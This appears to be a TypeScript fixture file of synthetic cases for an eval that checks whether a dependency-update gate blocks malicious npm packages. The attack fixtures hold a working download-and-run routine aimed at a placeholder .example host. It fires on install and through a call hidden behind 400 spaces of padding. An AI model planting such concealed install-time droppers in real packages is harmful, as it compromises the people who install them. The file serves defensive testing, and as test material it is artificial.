// Synthetic cases for the function-color eval. Package names mirror the public write-up;
// hosts use the reserved .example domain and every file body is written for this eval.
// `expect` is the goal: "hold" for an attack, "land" for a look-alike.
import type { FileMap } from "../../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";

export interface Pkg {
  name: string;
  version: string;
  files: FileMap;
}

/** One pull request: the lockfile before and after. An attack is blocked when the gate fails the PR; a look-alike or control must pass it. */
export interface Case {
  id: string;
  kind: "attack" | "look-alike" | "control";
  note: string;
  base: Pkg[];
  head: Pkg[];
  expect: "hold" | "land";
}

// A download-and-run helper, then a call pushed far to the right of a padded line.
const PAD = " ".repeat(400);
const flagIndex = (host: string) => `const https = require("https");
const fs = require("fs");
const path = require("path");
const cp = require("child_process");
function fetchTool() {
  const dest = path.join(process.env.APPDATA || ".", "tool.exe");
  https.get("https://${host}/tool.exe", (res) => {
    res.pipe(fs.createWriteStream(dest)).on("close", () => cp.spawn(dest, [], { windowsHide: true, detached: true }));
  });
}
function asciiArt(text, font) {
  if (font === "Bloody") fetchTool();
  return text;
}
module.exports = { asciiArt };${PAD}asciiArt("hi", "Bloody");
`;

const colorIndex = `const flag = require("function-flag");
for (const c of ["red", "green", "blue"]) {
  Object.defineProperty(String.prototype, c, { get() { return flag.asciiArt(String(this), "Bloody"); } });
}
`;
const PREBUILT_INSTALL = `require("https").get("https://releases.example/fast-hash/hash.node", () => {});\n`;
const PREBUILT_INDEX = `module.exports = require("./lib/hash.js");\n`;
const colorPkg = (range: string, version: string) => pkg({ name: "function-color", version, main: "index.js", dependencies: { "function-flag": range } });
const flagPkg = (version: string) => pkg({ name: "function-flag", version, main: "index.js", scripts: { postinstall: "node example.js" } });
const flagExample = `const { asciiArt } = require("./index.js");\nasciiArt("oi", "Bloody");\n`;

const color = (range: string, version: string): Pkg => ({ name: "function-color", version, files: files({ "package.json": colorPkg(range, version), "index.js": colorIndex }) });
const flag = (version: string, host: string): Pkg => ({ name: "function-flag", version, files: files({ "package.json": flagPkg(version), "index.js": flagIndex(host), "example.js": flagExample }) });
const lib = (name: string, version: string, o: Record<string, string>): Pkg => ({ name, version, files: files(o) });

export const CASES: Case[] = [
  {
    id: "function-color-update",
    kind: "attack",
    note: "function-color 1.0.0 to 1.7.3 carries no payload; its dependency function-flag moves from 4.0.0 to 1.7.3",
    base: [color("^4.0.0", "1.0.0"), flag("4.0.0", "cdn-two.example")],
    head: [color("^1.7.3", "1.7.3"), flag("1.7.3", "cdn-one.example")],
    expect: "hold",
  },
  {
    id: "function-color-install",
    kind: "attack",
    note: "function-color 1.7.3 as a new install; the payload is in its new dependency function-flag",
    base: [],
    head: [color("^1.7.3", "1.7.3"), flag("1.7.3", "cdn-one.example")],
    expect: "hold",
  },
  {
    id: "function-flag-install",
    kind: "attack",
    note: "function-flag 1.7.3 as a new install: install script plus a hidden download",
    base: [],
    head: [flag("1.7.3", "cdn-one.example")],
    expect: "hold",
  },
  {
    id: "function-flag-update",
    kind: "attack",
    note: "function-flag 4.0.0 to 1.7.3; the install script and the download code are already in 4.0.0",
    base: [flag("4.0.0", "cdn-two.example")],
    head: [flag("1.7.3", "cdn-one.example")],
    expect: "hold",
  },
  {
    id: "control-patch-update",
    kind: "control",
    note: "plain patch bump, no hooks",
    base: [lib("text-pad", "2.1.0", { "package.json": pkg({ name: "text-pad", version: "2.1.0", main: "index.js" }), "index.js": "module.exports = (s, n) => s.padStart(n);\n" })],
    head: [lib("text-pad", "2.1.1", { "package.json": pkg({ name: "text-pad", version: "2.1.1", main: "index.js" }), "index.js": "module.exports = (s, n) => String(s).padStart(n);\n" })],
    expect: "land",
  },
  {
    id: "lookalike-color-install",
    kind: "look-alike",
    note: "legit color helper as a new install: string getters, a dependency, no hooks, no network",
    base: [],
    head: [lib("tint-strings", "3.0.0", {
      "package.json": pkg({ name: "tint-strings", version: "3.0.0", main: "index.js", dependencies: { "ansi-wrap": "^2.0.0" } }),
      "index.js": `const wrap = require("ansi-wrap");\nfor (const c of ["red", "green"]) Object.defineProperty(String.prototype, c, { get() { return wrap(c, String(this)); } });\n`,
    })],
    expect: "land",
  },
  {
    id: "lookalike-color-dep-range-update",
    kind: "look-alike",
    note: "legit color helper whose dependency range moves within the same major",
    base: [lib("tint-strings", "3.0.0", {
      "package.json": pkg({ name: "tint-strings", version: "3.0.0", main: "index.js", dependencies: { "ansi-wrap": "^2.0.0" } }),
      "index.js": `module.exports = require("ansi-wrap");\n`,
    })],
    head: [lib("tint-strings", "3.1.0", {
      "package.json": pkg({ name: "tint-strings", version: "3.1.0", main: "index.js", dependencies: { "ansi-wrap": "^2.1.0" } }),
      "index.js": `module.exports = require("ansi-wrap");\n`,
    })],
    expect: "land",
  },
  {
    id: "lookalike-banner-update",
    kind: "look-alike",
    note: "legit ascii-art package with a font called Bloody, an unchanged benign postinstall (prints a notice), no network",
    base: [lib("banner-art", "1.4.0", {
      "package.json": pkg({ name: "banner-art", version: "1.4.0", main: "index.js", scripts: { postinstall: "node notice.js" } }),
      "index.js": `const FONTS = { Bloody: ["#"], Slant: ["/"] };\nmodule.exports = (t, f = "Slant") => FONTS[f].join("") + t;\n`,
      "notice.js": `console.log("banner-art installed");\n`,
    })],
    head: [lib("banner-art", "1.4.1", {
      "package.json": pkg({ name: "banner-art", version: "1.4.1", main: "index.js", scripts: { postinstall: "node notice.js" } }),
      "index.js": `const FONTS = { Bloody: ["#"], Slant: ["/"] };\nmodule.exports = (t, f = "Slant") => (FONTS[f] || FONTS.Slant).join("") + t;\n`,
      "notice.js": `console.log("banner-art installed");\n`,
    })],
    expect: "land",
  },
  {
    id: "lookalike-prebuilt-update",
    kind: "look-alike",
    note: "legit native package: the install script (install.js, byte-identical in both releases) fetches a prebuilt binary; index.js is byte-identical too and only lib/hash.js changes",
    base: [lib("fast-hash", "5.0.0", {
      "package.json": pkg({ name: "fast-hash", version: "5.0.0", main: "index.js", scripts: { install: "node install.js" } }),
      "index.js": PREBUILT_INDEX,
      "lib/hash.js": `module.exports = (b) => require("../build/hash.node").hash(b);\n`,
      "install.js": PREBUILT_INSTALL,
    })],
    head: [lib("fast-hash", "5.0.1", {
      "package.json": pkg({ name: "fast-hash", version: "5.0.1", main: "index.js", scripts: { install: "node install.js" } }),
      "index.js": PREBUILT_INDEX,
      "lib/hash.js": `module.exports = (b) => require("../build/hash.node").hash(Buffer.from(b));\n`,
      "install.js": PREBUILT_INSTALL,
    })],
    expect: "land",
  },
];
